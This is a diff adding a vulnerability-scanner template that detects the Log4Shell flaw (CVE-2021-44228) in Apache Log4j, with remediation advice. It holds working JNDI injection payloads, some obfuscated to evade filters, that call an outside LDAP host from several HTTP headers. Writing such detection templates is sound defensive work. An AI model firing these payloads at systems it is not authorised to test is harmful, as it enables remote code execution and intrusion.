@@ -1,0 +1,50 @@
+id: log4shell-jndi
+info:
+  name: Log4Shell JNDI Injection (CVE-2021-44228)
+  severity: critical
+  tags: [cves-rce-critical, log4j, rce, jndi, cve-2021-44228]
+  description: "Detects CVE-2021-44228, a remote code execution vulnerability in Apache Log4j 2. Attackers inject JNDI lookup strings into logged HTTP headers, triggering outbound LDAP connections and potentially arbitrary code execution."
+  remediation: "Upgrade Log4j to 2.17.1 or later. Set log4j2.formatMsgNoLookups=true as a workaround. Remove JndiLookup class from the classpath if upgrading is not immediately possible."
+  cwe: "CWE-917"
+  owasp: "A03:2021-Injection"
+
+payloads:
+  jndi_payload:
+    - "${jndi:ldap://{{rand_str(8)}}.r87.me/a}"
+    - "${${lower:j}ndi:ldap://{{rand_str(8)}}.r87.me/a}"
+    - "${${::-j}${::-n}${::-d}${::-i}:ldap://{{rand_str(8)}}.r87.me/a}"
+
+requests:
+  - method: GET
+    paths:
+      - /api/v1/user
+      - /
+      - /login
+      - /console
+    headers:
+      X-Api-Version: "{{jndi_payload}}"
+      User-Agent: "{{jndi_payload}}"
+      Referer: "{{jndi_payload}}"
+      X-Forwarded-For: "{{jndi_payload}}"
+    stop-at-first-match: false
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "javax.naming"
+          - "NamingException"
+          - "JNDI"
+          - "log4j"
+          - "java.lang.RuntimeException"
+        part: body
+        condition: or
+      - type: regex
+        regex:
+          - "exception.*lookup"
+          - "lookup.*failed"
+          - "error.*jndi"
+        part: body
+        condition: or
+      - type: dsl
+        dsl: "status_code == 500 && contains(to_lower(body), 'exception')"
